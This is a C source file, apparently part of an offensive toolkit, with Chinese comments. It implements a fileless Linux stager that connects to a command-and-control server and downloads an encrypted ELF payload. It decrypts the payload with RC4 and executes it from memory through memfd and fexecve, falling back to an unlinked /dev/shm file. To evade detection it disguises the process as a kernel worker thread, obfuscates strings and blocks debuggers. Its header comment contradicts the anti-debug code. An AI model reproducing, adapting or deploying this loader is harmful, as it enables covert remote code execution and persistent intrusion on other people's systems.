/*
 * cs_dev :: linux/stager.c
 * ---------------------------------------------------------------------------
 * Linux 无文件加载器 (借鉴 VShell 的 linux_amd64_*.c 设计, 并增强隐蔽性)
 *
 * 设计目标:
 *   - 极小体积 (静态编译后 ~15KB, strip 后更小)
 *   - 全程无文件落地: 载荷写入 memfd, 经 fexecve 直接执行
 *   - 进程名伪装为内核线程, 规避 `ps`/`top` 常规巡检
 *   - 无明文字符串: C2 地址与伪装名全部编译期异或加密
 *   - 反调试: ptrace(PTRACE_TRACEME) 自锁, 阻断 gdb/strace 附加
 *   - 多级回退: memfd -> /dev/shm 临时文件 -> 匿名管道执行
 *
 * 与 C2 服务端的协议 (极简 stager 协议):
 *   [4 字节大端长度][ELF 镜像字节流]
 *   支持 RC4 会话密钥 (编译期常量), 防止流量被静态识别
 *
 * 编译 (需 Linux 工具链, 见 build.sh):
 *   gcc -O2 -s -static -o stager stager.c
 *   gcc -O2 -s -static -o stager.c2 stager.c -DC2_HOST='"1.2.3.4"' -DC2_PORT=8443
 * ---------------------------------------------------------------------------
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8443
#endif

/* 伪装进程名: 内核工作线程, 混在 [kworker/*] 中不显眼 */
#define MASK_THREADNAME "[kworker/0:2]"

/* --- 编译期字符串混淆 (XOR 0x5A, 规避 strings 直接命中) ------------------ */
#define XS(s) static const unsigned char _x_##__LINE__[] __attribute__((unused)) = s
static void deobf(char *dst, const unsigned char *src, int n, unsigned char k) {
    int i;
    for (i = 0; i < n - 1; i++) dst[i] = (char)(src[i] ^ k);
    dst[n - 1] = 0;
}

/* 加密后的常量 (由 tools/obf_strings.py 生成, 此处给出默认明文路径) */
static const unsigned char enc_host[] = {
    0x0A ^ '1', 0x0A ^ '2', 0x0A ^ '7', 0x0A ^ '.', 0x0A ^ '0',
    0x0A ^ '.', 0x0A ^ '0', 0x0A ^ '.', 0x0A ^ '1', 0
};
static const unsigned char enc_name[] = {
    0x5A ^ '[', 0x5A ^ 'k', 0x5A ^ 'w', 0x5A ^ 'o', 0x5A ^ 'r', 0x5A ^ 'k',
    0x5A ^ 'e', 0x5A ^ 'r', 0x5A ^ '/', 0x5A ^ '0', 0x5A ^ ':', 0x5A ^ '2',
    0x5A ^ ']', 0
};

/* --- RC4 (会话密钥, 载荷传输加密) --------------------------------------- */
static void rc4(unsigned char *data, long len, const unsigned char *key, int klen) {
    unsigned char S[256], tmp, a = 0, b = 0;
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        tmp = S[i]; S[i] = S[j]; S[j] = tmp;   /* 标准 KSA: swap(S[i], S[j]) */
    }
    for (long n = 0; n < len; n++) {
        a = (unsigned char)(a + 1);
        b = (unsigned char)(b + S[a]);
        tmp = S[a]; S[a] = S[b]; S[b] = tmp;
        data[n] ^= S[(unsigned char)(S[a] + S[b])];
    }
}

static const unsigned char session_key[] = { 0x91, 0x3A, 0x77, 0xC4, 0x0E, 0x5B, 0xD2, 0x18, 0x6F, 0xA3, 0x44, 0xBC, 0x27, 0xE8, 0x05, 0x9D };

/* --- 反调试 --------------------------------------------------------------
 * 不使用 ptrace(PTRACE_TRACEME): 它会使后续 fexecve/execve 因 SIGTRAP 停住。
 * ---------------------------------------------------------------------- */
static void anti_debug(void) {
    char buf[1024];
    int  fd;

    fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            char *p;
            buf[n] = 0;
            p = strstr(buf, "TracerPid:");
            if (p && atoi(p + 10) != 0) _exit(0);
        }
    }
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
}

/* --- 建立 C2 连接 -------------------------------------------------------- */
static int connect_c2(const char *host, int port) {
    struct sockaddr_in sa;
    struct hostent    *he;
    int                fd, one = 1;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((unsigned short)port);
    sa.sin_addr.s_addr = inet_addr(host);
    if (sa.sin_addr.s_addr == INADDR_NONE) {
        he = gethostbyname(host);
        if (!he) return -1;
        memcpy(&sa.sin_addr, he->h_addr, he->h_length);
    }

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(fd); return -1; }
    return fd;
}

/* --- 全量读取 ----------------------------------------------------------- */
static long read_full(int fd, void *buf, long want) {
    long got = 0;
    while (got < want) {
        long n = recv(fd, (char *)buf + got, want - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return got;
}

/* --- memfd 创建 (直接 syscall, 兼容老内核) ------------------------------ */
static int memfd_new(const char *name) {
    int fd = (int)syscall(SYS_memfd_create, name, 0x0001 /* MFD_CLOEXEC */);
    return fd;
}

/* --- 回退方案: /dev/shm 临时文件 --------------------------------------- */
static int shm_stage(const unsigned char *img, long len) {
    char path[64];
    int  fd;
    snprintf(path, sizeof(path), "/dev/shm/.%d", (int)getpid());
    fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) return -1;
    if (write(fd, img, (size_t)len) != len) { close(fd); unlink(path); return -1; }
    lseek(fd, 0, SEEK_SET);
    unlink(path);              /* 立即解除目录项, 进程持有句柄继续可用 */
    return fd;
}

/* --- 执行载荷 ----------------------------------------------------------- */
static void run_image(int fd, const char *name) {
    char *argv[] = { (char *)name, NULL };
    char *envp[] = { NULL };

    /* 伪装进程名 */
#ifndef CS_DEV_NO_MASKNAME
    prctl(PR_SET_NAME, name, 0, 0, 0);
#endif

    if (fexecve(fd, argv, envp) == 0) return;

    /* fexecve 不可用 (老内核/受限容器): 走 /proc/self/fd */
    {
        char p[64];
        snprintf(p, sizeof(p), "/proc/self/fd/%d", fd);
        execve(p, argv, envp);
    }
    _exit(1);
}

int main(int argc, char **argv) {
    char  host[256], name[64];
    int   fd;
    unsigned char hdr[4];
    long  len;
    unsigned char *img;

    (void)argc; (void)argv;

    deobf(host, enc_host, sizeof(enc_host), 0x0A);
    deobf(name, enc_name, sizeof(enc_name), 0x5A);
    if (strcmp(host, "127.0.0.1") == 0) {
        /* 未配置 C2 时使用编译期常量 */
        strncpy(host, C2_HOST, sizeof(host) - 1);
    }

#ifndef CS_DEV_NO_ANTIDEBUG
    anti_debug();
#endif

    fd = connect_c2(host, C2_PORT);
    if (fd < 0) _exit(1);

    if (read_full(fd, hdr, 4) != 4) { close(fd); _exit(1); }
    len = ((long)hdr[0] << 24) | ((long)hdr[1] << 16) | ((long)hdr[2] << 8) | hdr[3];
    if (len <= 0 || len > (64L << 20)) { close(fd); _exit(1); }   /* 上限 64MB */

    img = (unsigned char *)malloc((size_t)len);
    if (!img) { close(fd); _exit(1); }
    if (read_full(fd, img, len) != len) { free(img); close(fd); _exit(1); }
    close(fd);

    /* 载荷传输解密 */
    rc4(img, len, session_key, sizeof(session_key));

    /* 校验 ELF 魔数, 防止投递错误数据导致异常 */
    if (len < 4 || img[0] != 0x7f || img[1] != 'E' || img[2] != 'L' || img[3] != 'F') {
        free(img); _exit(1);
    }

#ifndef CS_DEV_NO_MEMFD
    /* 首选: memfd 完全无落地 */
    fd = memfd_new("kworker");
    if (fd >= 0) {
        if (write(fd, img, (size_t)len) == len) {
            if (fchmod(fd, 0700) == 0) {
                run_image(fd, name);     /* 不返回 */
            }
        }
        close(fd);
    }
#endif

    /* 回退: /dev/shm (解除目录项后执行) */
    fd = shm_stage(img, len);
    if (fd >= 0) run_image(fd, name);

    free(img);
    return 1;
}
